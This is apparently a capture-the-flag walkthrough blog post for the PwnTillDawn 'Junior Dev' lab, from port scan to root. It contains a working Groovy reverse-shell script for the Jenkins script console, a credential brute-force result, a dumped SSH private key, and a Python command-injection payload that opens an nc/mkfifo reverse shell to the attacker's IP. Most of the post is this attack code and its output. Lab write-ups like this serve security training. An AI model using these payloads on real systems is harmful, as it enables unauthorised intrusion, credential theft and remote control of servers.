---
categories: [PwnTillDawn]
tags: [Jenkins, Password Cracking, Port Forwarding, Python Command Injection]
image:
  path: /Vulnhub-Files/img/JuniorDev/Untitled.png
  alt: Junior Dev -> https://www.wizlynxgroup.com/ , https://online.pwntilldawn.com/
---

## Port Scan Results ➡️

```bash
┌──(kali㉿kali)-[~/Downloads/PwnTillDawn/10.150.150.38]
└─$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.150.150.38                                   
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-03 15:18 IST
Nmap scan report for 10.150.150.38
Host is up (0.19s latency).
Not shown: 65437 closed tcp ports (reset), 82 filtered tcp ports (host-unreach), 14 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 64:63:02:cb:00:44:4a:0f:95:1a:34:8d:4e:60:38:1c (RSA)
|   256 0a:6e:10:95:de:3d:6d:4b:98:5f:f0:cf:cb:f5:79:9e (ECDSA)
|_  256 08:04:04:08:51:d2:b4:a4:03:bb:02:71:2f:66:09:69 (ED25519)
30609/tcp open  http    Jetty 9.4.27.v20200227
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.27.v20200227)
|_http-title: Site doesnt have a title (text/html;charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
{: .nolineno}

## Web Enumeration ➡️

![Untitled](/Vulnhub-Files/img/JuniorDev/Untitled%201.png)

Now lets brute-force the credentails with username as admin and password I bruteforced it with hydra tool →

![Untitled](/Vulnhub-Files/img/JuniorDev/Untitled%202.png)

```bash
admin : matrix
```
{: .nolineno}

![Untitled](/Vulnhub-Files/img/JuniorDev/Untitled%203.png)

I got logged in as admin so lets exploit now →

Now I have to get a reverse shell so I followed this site →

[https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6](https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6)

Groovy Script Reverse Shell →

```bash
String host=”10.66.67.202”;
int port=4444;
String cmd=”/bin/bash”;
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
{: .nolineno}

![Untitled](/Vulnhub-Files/img/JuniorDev/Untitled%204.png)

In response to that I got this →

```bash
┌──(kali㉿kali)-[~/Downloads/PwnTillDawn/10.150.150.38]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.66.67.202] from (UNKNOWN) [10.150.150.38] 60808
python3 -c 'import pty;pty.spawn("/bin/bash")'
jenkins@dev1:/$ whoami
whoami
jenkins
jenkins@dev1:/$ id
id
uid=105(jenkins) gid=112(jenkins) groups=112(jenkins)
jenkins@dev1:/$ pwd
pwd
/
jenkins@dev1:/$
```
{: .nolineno}

Now I got the shell so lets go deep →

Got FLAGs on jenkins home directoy inside /users/ directory →

```bash
FLAG69 :dffc1dc67f3d55d2b14227b73b590c4ed09b5113
```
{: .nolineno}

```bash
jenkins@dev1:~$ cat FLAG70.txt 
41796ff9d0e29c02c961daa93454942d9c6bea7d
jenkins@dev1:~$
```
{: .nolineno}

Now lets check the .bash_history file here →

```bash
jenkins@dev1:~$ cat .bash_history 
history 
exit
history 
exit
cat /home/juniordev/.ssh/id_rsa
exit
cat .ssh/id_rsa
cat /home/juniordev/.ssh/id_rsa
netstat -natupl
curl
curl
ps aux
ps aux | grep root
ps aux | grep 8080
exit
jenkins@dev1:~$ 
```
{: .nolineno}

So I can `cat` the data inside the `id_rsa` file of `juniordev` user , so lets do it →

```bash
jenkins@dev1:~$ cat /home/juniordev/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAutE2eBkhuyABIPkuGJwfsu+rmmcd/f66OU8gwZ8z60ahlcxRTfhp
zN4JkbwvqyvXfEqOzUQgTSy+jl19hJsFdaH9eJIRb6Kgj1I24ynDUP+tiXv8CaTix62pf7
8v/D2ChO0ToG1EzqPsfUG6cNG0FR5Rht8/rqBAQIq6RAHVBg/RKiyRPSW4Z1K3Az559345
5UDgAS4/luKMc7Kw0j6THzYG/suDWsbePa7GPAKLNUPvy/sUdpoGmJqCd8nfrpgbxJonv0
7erSOmn64g25Wac5CwQ3FymrR93HfQ1rqcxAFSXI8vBgx1BKd6uQ8fw1wDmfzq01pL29Ny
Ae8rlC/EXQAAA8i38al7t/GpewAAAAdzc2gtcnNhAAABAQC60TZ4GSG7IAEg+S4YnB+y76
uaZx39/ro5TyDBnzPrRqGVzFFN+GnM3gmRvC+rK9d8So7NRCBNLL6OXX2EmwV1of14khFv
oqCPUjbjKcNQ/62Je/wJpOLHral/vy/8PYKE7ROgbUTOo+x9Qbpw0bQVHlGG3z+uoEBAir
pEAdUGD9EqLJE9JbhnUrcDPnn3fjnlQOABLj+W4oxzsrDSPpMfNgb+y4Naxt49rsY8Aos1
Q+/L+xR2mgaYmoJ3yd+umBvEmie/Tt6tI6afriDblZpzkLBDcXKatH3cd9DWupzEAVJcjy
8GDHUEp3q5Dx/DXAOZ/OrTWkvb03IB7yuUL8RdAAAAAwEAAQAAAQA5yhgQZK3Thd3zhkFl
KX6AyrUJyVY0yQRwT/LxEj9sS2gWv6Jy/SI1VoYdR9pzF9fLwgCUrLtVRD8aKP938sBomB
ihoIW2Q9dpHmSONtANkVnsSqc3kIL6g9UICGtemuRyHChTGxoK1hiE0r1KwwPy+HL9xreb
XEUj8gYWnX55JgnNRnxgHo1ws2YRD0L/+j6jSbf1HstLuhupz6JPGCS6Ev6IVt9w2catEQ
I1chKx0W/pgXC2E3qxzoGahaFtzBnOlIlp9gUJDF/UKbRwrVB2Dm8amgaIKWng+aWlWsRB
LUIt9QvAGnphdH5CLdGb22UQ/3Ke5J1e+zRJ4mqNpZGBAAAAgQCPdYfTvB1Tat+k8ZbCVc
XOUFa5KuPJa5iOcHJT90fAJVjLp53LGTCd66QRUB+y30jaVFZQTDPVqdpOCaBq4qdWvQmU
X7nrLuH+R1U7gE3rCq0qrhD9OLsQBaHI1yisN/30+OcqQmqKLcjtWEKwPRU0ASLMEkkcFh
H18RYd/0y7FAAAAIEA6l21bcwPQe/rN5MxPbmNUtxZzEXe9aJw4SQd4fGIwo73gK3Ppb5z
vOhUcCKH5TFGhCwlvTen0VyLJcloGM1H7xXjm1lZdbpsifIONms/nCQgDvOaxTq/4RIAHW
uolQblUbaleM3qhsDnq8bBGqZAY0iuccC1RYLpjl8rynAE36EAAACBAMwP4XRz977LV5pA
xQraLfy46irxfENlAGttvrSAiE6VoIuaZVJhwUl6iFkS6/rPv2wRKXNi6D9lcC9/yHPpQw
v7Hlj/XcPHHpjWxXmxybyNtUjXm/g93802g/4I75ZEe9d97lZSuTQiWcsZZiD5b09+7HZK
WtJNIy1nwgxLoJs9AAAADmp1bmlvcmRldkBkZXYxAQIDBA==
-----END OPENSSH PRIVATE KEY-----
jenkins@dev1:~$
```
{: .nolineno}

Now lets log into `juniordev` user through ssh login with id_rsa file →

```bash
┌──(kali㉿kali)-[~/Downloads/PwnTillDawn/10.150.150.38]
└─$ ssh -i id_rsa juniordev@10.150.150.38         
The authenticity of host '10.150.150.38 (10.150.150.38)' cant be established.
ED25519 key fingerprint is SHA256:Wt+hABI/6c4jJNCmJR1zAkO8T/S52lAvH7ST/rnQz6o.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.150.150.38' (ED25519) to the list of known hosts.
Linux dev1 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Jun  8 22:19:46 2020 from 10.210.210.120
juniordev@dev1:~$ whoami
juniordev
juniordev@dev1:~$ id
uid=1000(juniordev) gid=1000(juniordev) groups=1000(juniordev),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
juniordev@dev1:~$ ls -al
total 32
drwxr-xr-x 5 juniordev juniordev 4096 Jun 15 10:51 .
drwxr-xr-x 3 root      root      4096 Apr 13 11:09 ..
-rw-r--r-- 1 juniordev juniordev  220 Apr 13 11:09 .bash_logout
-rw-r--r-- 1 juniordev juniordev 3541 Apr 20 11:48 .bashrc
drwx------ 3 juniordev juniordev 4096 Apr 17 13:02 .gnupg
drwxr-xr-x 3 juniordev juniordev 4096 Apr 17 16:30 .local
-rw-r--r-- 1 juniordev juniordev  807 Apr 13 11:09 .profile
drwx-----x 2 juniordev juniordev 4096 Jun  8 16:15 .ssh
juniordev@dev1:~$
```
{: .nolineno}

Now I seen the network configuration and I got to know about port 8080 running so for access that I need to perform `port forwarding` →

```bash
juniordev@dev1:/tmp$ ss -tunlp
Netid         State          Recv-Q         Send-Q                 Local Address:Port                  Peer Address:Port        
tcp           LISTEN         0              5                          127.0.0.1:8080                       0.0.0.0:*           
tcp           LISTEN         0              128                          0.0.0.0:22                         0.0.0.0:*           
tcp           LISTEN         0              50                                 *:30609                            *:*           
tcp           LISTEN         0              128                             [::]:22                            [::]:*           
juniordev@dev1:/tmp$
```
{: .nolineno}

On Attackers Machine I have to reset the ssh ->

```bash
┌──(kali㉿kali)-[~/Downloads/PwnTillDawn/10.150.150.38]
└─$ sudo systemctl enable ssh                     
Synchronizing state of ssh.service with SysV service script with /lib/systemd/systemd-sysv-install.
Executing: /lib/systemd/systemd-sysv-install enable ssh
                                                                                                                                
┌──(kali㉿kali)-[~/Downloads/PwnTillDawn/10.150.150.38]
└─$ sudo systemctl start ssh
```
{: .nolineno}

On Victim Machine  lets connect the Attackers machine to victim machine →

```bash
juniordev@dev1:/tmp$ ssh kali@10.66.67.202 -R 8080:localhost:8080
The authenticity of host '10.66.67.202 (10.66.67.202)' cant be established.
ECDSA key fingerprint is SHA256:7OvWn1lnqFObProwjcZQcBd85Tb+nXCUoPJI6Q/us8Q.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.66.67.202' (ECDSA) to the list of known hosts.
kali@10.66.67.202s password: 
Linux kali 6.3.0-kali1-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.3.7-1kali1 (2023-06-29) x86_64

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
┌──(kali㉿kali)-[~]
└─$
```
{: .nolineno}

I got this calculator page after loading this `localhost:8080` on web →

![Untitled](/Vulnhub-Files/img/JuniorDev/Untitled%205.png)

I refreshed the page and seen the source code →

![Untitled](/Vulnhub-Files/img/JuniorDev/Untitled%206.png)

Lets see the flag →

![Untitled](/Vulnhub-Files/img/JuniorDev/Untitled%207.png)

```bash
FLAG71 : d3c7c338d5d8370e5c61fd68e101237a4d438408
```
{: .nolineno}

while enumerating I also noticed that this service is running as root →

![Untitled](/Vulnhub-Files/img/JuniorDev/Untitled%208.png)

Now lets exploit this service through including python command injection exploit on the web server →

```bash
__import__("os").system('rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.66.67.202+2222+>/tmp/f')
```
{: .nolineno}

![Untitled](/Vulnhub-Files/img/JuniorDev/Untitled%209.png)

I tried reverse shell and I got it in response →

```bash
┌──(kali㉿kali)-[~/Downloads/PwnTillDawn/10.150.150.38]
└─$ nc -lvnp 2222
listening on [any] 2222 ...
connect to [10.66.67.202] from (UNKNOWN) [10.150.150.38] 56418
/bin/sh: 0: cant access tty; job control turned off
# python3 -c 'import pty;pty.spawn("/bin/bash")'
root@dev1:~/mycalc# whoami
whoami
root
root@dev1:~/mycalc# id
id
uid=0(root) gid=0(root) groups=0(root)
root@dev1:~/mycalc# cd /root
cd /root
root@dev1:~# ls -al
ls -al
total 40
drwx------  7 root root 4096 Jun 15 18:53 .
drwxr-xr-x 18 root root 4096 Apr 13 11:06 ..
-rw-------  1 root root    0 Apr 20 12:07 .bash_history
-rw-r--r--  1 root root  585 Apr 20 11:47 .bashrc
drwx------  3 root root 4096 Apr 17 12:32 .cache
-r--------  1 root root   41 Apr 17 16:23 FLAG72.txt
drwx------  3 root root 4096 Apr 13 13:41 .gnupg
drwxr-xr-x  3 root root 4096 Apr 13 11:23 .local
drwxr-xr-x  5 root root 4096 Jun 15 11:00 mycalc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Jun  8 16:13 .ssh
root@dev1:~# cat FLAG72.txt
cat FLAG72.txt
ab77beb9cdadc97f3644a00706076293ee8cbbd2
root@dev1:~#
```

> If you have any questions or suggestions, please leave a comment below.
Thank You ! 
{: .prompt-tip }